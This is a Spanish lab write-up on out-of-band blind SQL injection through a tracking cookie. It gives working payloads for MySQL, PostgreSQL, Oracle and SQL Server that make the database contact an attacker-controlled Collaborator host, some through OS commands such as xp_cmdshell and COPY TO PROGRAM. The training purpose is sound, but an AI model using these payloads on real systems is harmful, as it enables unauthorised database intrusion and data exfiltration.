
---

#  Inyecciones SQL con ut‑of‑band (OOB) interaction  

## ¿Qué es OOB blind SQLi?

En _blind_ SQLi no obtenemos datos directamente en la respuesta HTTP; en OOB usamos una interacción externa (DNS/HTTP) generada desde la base de datos para **confirmar la ejecución de código** y, potencialmente, exfiltrar información. En este laboratorio la base de datos ejecuta la consulta **asíncronamente** y la respuesta de la aplicación no cambia, pero si conseguimos que la BD haga una petición DNS/HTTP a un dominio que controlamos (Burp Collaborator), veremos la interacción y confirmaremos la inyección.

## Flujo operativo (cómo lo hacemos)

1. **Obtenemos una URL de Burp Collaborator** (usamos el servidor público por defecto del laboratorio). Esto nos da algo como `abcd1234.oastify.com` o similar (Burp nos da el host completo).
    
2. **Identificamos el punto de inyección** (en este caso la cookie `TrackingId`).
    
3. **Construimos una payload** que, cuando se ejecute en la BD, provoque una petición hacia `NUESTRO_ID.burpcollaborator.net` (o el host que nos dé Burp).
    
4. **Enviamos la petición** y esperamos la interacción en Burp Collaborator.
    
5. **Confirmamos en Burp**: si vemos una consulta DNS o una petición HTTP desde el laboratorio, la explotación OOB ha funcionado.
    
6. **Documentamos** (payload usado, host de collaborator, timestamp, evidencia).
    

> Nota del laboratorio: el firewall del Academy bloquea interacciones hacia servidores arbitrarios — **hay que usar el servidor público por defecto de Burp Collaborator** que la plataforma permite.

---

## Ejemplos prácticos (payloads de OOB por motor)

> Reemplazad `<COLLAB>` por el identificador/host que os dé Burp Collaborator (ej. `abcd1234.oastify.net`). Las funciones pueden estar deshabilitadas según configuración; si una no funciona, probamos otra.

### MySQL (ejemplo posible vía UNC path / LOAD_FILE en entornos Windows)

```sql
' OR (SELECT LOAD_FILE(CONCAT('\\\\', '<COLLAB>', '\\p')))-- -
```

- Idea: forzamos una resolución DNS/SMB intentando acceder a un recurso UNC `\\<COLLAB>\p`. En algunos entornos esto provoca una consulta DNS/SMB hacia `<COLLAB>`.
    
- Caveat: `LOAD_FILE` y acceso a UNC puede no estar disponible; depende del servidor y permisos.
    

### PostgreSQL (ejemplo con COPY TO PROGRAM — Linux)

```sql
' ; COPY (SELECT '') TO PROGRAM 'ping -c 1 <COLLAB>' ; --
```

- Idea: `COPY ... TO PROGRAM` ejecuta comandos del sistema (si está permitido) que pueden provocar una resolución DNS.
    
- Caveat: `COPY TO PROGRAM` suele estar deshabilitado en entornos hardened; si está activado, genera OOB.
    

### Oracle (UTL_HTTP.request)

```sql
' OR (SELECT UTL_HTTP.request('http://<COLLAB>/') FROM dual)-- 
```

- Idea: `UTL_HTTP.request()` realiza una petición HTTP a la URL indicada, provocando una interacción OOB con el collaborator.
    
- Caveat: `UTL_HTTP` puede requerir privilegios o ACLs; si está disponible, es muy fiable para OOB HTTP.
    

### Microsoft SQL Server (SMB / xp_cmdshell / OPENROWSET)

Opción típica (si `xp_cmdshell` habilitado):

```sql
'; EXEC xp_cmdshell 'nslookup <COLLAB>'-- 
```

Opción SMB via UNC (si la utilidad que intente acceder a UNC existe):

```sql
'; SELECT * FROM OPENROWSET('SQLNCLI', 'Server=\\<COLLAB>\share;Trusted_Connection=yes;','SELECT 1')-- 
```

- Idea: `xp_cmdshell` ejecuta comandos OS (nslookup/ping) y provoca resolución DNS; OPENROWSET con UNC también puede forzar lookup.
    
- Caveat: `xp_cmdshell` suele estar deshabilitado por seguridad en servidores productivos.
    

---

## Dónde inyectarlo (ejemplo cookie TrackingId)

Si la aplicación lee la cookie y la concatena en una consulta, inyectamos la payload dentro del valor de la cookie. Ejemplo conceptual:

```
TrackingId=VALOR_ORIGINAL' OR (SELECT UTL_HTTP.request('http://<COLLAB>/'))-- 
```

ó (MySQL UNC):

```
TrackingId=VALOR_ORIGINAL' OR (SELECT LOAD_FILE(CONCAT('\\\\','<COLLAB>','\\p')))-- 
```

Recordad url‑encodear si la cookie lo necesita.

---

## Buenas prácticas y comprobaciones

- **Usamos Burp Collaborator** y esperamos la interacción (DNS/HTTP).
    
- **Si no vemos nada**, probamos otra técnica (SMB UNC, HTTP via UTL_HTTP, xp_cmdshell, COPY TO PROGRAM).
    
- **Calibramos**: pruebas con cargas simples primero (ej.: `UTL_HTTP.request('http://<COLLAB>/test')`).
    
- **Evidencia**: guardamos la petición original (con la cookie), la interacción en Collaborator y timestamps.
    
- **Ética**: solo en laboratorio o con autorización.
    

---

## Resumen corto (qué hacemos y por qué funciona)

- En OOB blind SQLi no recibimos datos en la respuesta HTTP, así que **forzamos que la BD haga una petición a un dominio que controlamos** (Burp Collaborator).
    
- Si la BD realiza la solicitud (DNS/HTTP), la interacción aparece en Collaborator: **confirmación inequívoca** de ejecución de la inyección.
    
- La técnica concreta depende del motor de BD y de las funciones habilitadas; por eso probamos alternativas por motor.
    

---
